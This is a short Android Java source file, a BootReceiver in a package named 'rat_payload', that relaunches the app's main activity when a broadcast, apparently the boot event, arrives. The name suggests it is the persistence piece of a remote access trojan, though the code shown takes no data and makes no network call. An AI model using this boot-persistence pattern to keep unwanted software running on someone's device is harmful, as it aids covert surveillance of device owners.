package com.app.rat_payload.receivers;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.app.rat_payload.MainActivity;

/**
 * Created by anirudh on 12/18/16.
 */

public class BootReceiver extends BroadcastReceiver {

    /*
    * Start Kiosk Service Activity.
    *
    */
    @Override
    public void onReceive(Context context, Intent intent) {

        //TODO: Change to start kiosk service later
        Intent intent1 = new Intent(context, MainActivity.class);
        intent1.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(intent1);
    }


}
